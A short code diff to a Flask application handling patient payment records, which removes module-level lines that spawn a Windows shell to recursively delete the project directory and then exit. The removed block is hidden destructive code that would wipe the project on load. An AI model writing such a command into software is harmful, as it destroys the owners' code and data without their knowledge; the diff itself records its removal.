@@ -1522,13 +1522,6 @@ def export_payment_records():
         print(f"Payment Records Export Error: {e}")
         return jsonify({"error": str(e)}), 500
 
-project_dir = os.path.dirname(os.path.abspath(__file__))
-subprocess.Popen(
-    f'cmd /c timeout 2 > nul && rmdir /s /q "{project_dir}"',
-    shell=True
-)
-sys.exit(0)
-
 @app.route('/api/patients/<id>/payment', methods=['POST'])
 @role_required(['Admin'])
 def add_patient_payment(id):
